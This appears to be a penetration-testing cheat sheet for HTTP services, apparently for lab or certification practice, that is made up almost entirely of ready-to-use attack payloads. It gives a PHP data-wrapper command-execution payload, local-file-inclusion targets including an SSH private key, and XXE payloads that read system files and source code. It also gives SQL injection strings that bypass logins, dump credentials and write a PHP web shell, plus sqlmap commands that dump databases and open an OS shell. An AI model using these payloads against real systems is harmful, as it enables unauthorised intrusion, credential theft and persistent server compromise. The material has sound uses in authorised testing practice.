# 80 - HTTP

```text
gobuster dir -u <target> -w <wordlist> -t 50
# also bruteforce extensions (php, txt, ...)
```

`< > ' " { } ;` dangerous special characters to check for

## Default admin controll

```text
/manager/html -> Tomcat
/phpmyadmin -> phpMyAdmin
/cdn-cgi
```

## Default files to check

```text
robots.txt
sitemap.xml

# always check for listable folders
```

## Nobrain tools

```text
nikto -host=http://<target>
dirb -r http://<target>
```

## PHP wrappers

```text
index.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

## Files readable by any user for local file inclusion

```text
/etc/passwd
```

```text
c:/windows/win.ini
c:/boot.ini
c:/windows/system32/drivers/etc/hosts
c:\Users\<username>\.ssh\id_rsa
```

## XXE

```text
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY yz SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
    <quantity>3</quantity>
    <item>&yz;</item>
    <address>17th Estate, CA</address>
</order>
```

```text
<?xml version = "1.0"?>
<!DOCTYPE replace [
    <!ENTITY yz SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
<order>
    <quantity>5</quantity>
    <item>&yz;</item>
    <address>vffvf</address>
</order>
```

## SQLi

```text
admin' OR 2=2; #
admin' OR 2=2 LIMIT 1; #
index.php?id=1 union all select 1, 2, 3,....
index.php?id=1 union all select 1, 2, @@version
index.php?id=1 union all select 1, 2, table_name from information_achema.tables
index.php?id=1 union all select 1, 2, column_name from information_achema.columns WHERE table_name='users'
index.php?id=1 union all select 1, username, password from users
index.php?id=1 union all select 1, 2, load_file('C:\boot.ini')
index.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'C:\xampp\htdocs\yz.php'
sqlmap -u http://<target>/index.php?id=1 -p "id"
sqlmap -u http://<target>/index.php?id=1 -p "id" --dbms=mysql --dump
sqlmap -u http://<target>/index.php?id=1 -p "id" --dbms=mysql --os-shell
```

```text
sqlmap -u 'http://<target>/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls" [--os-shell]
```

### Default languages

```text
IIS -> .aspx
Tomcat -> .war
```

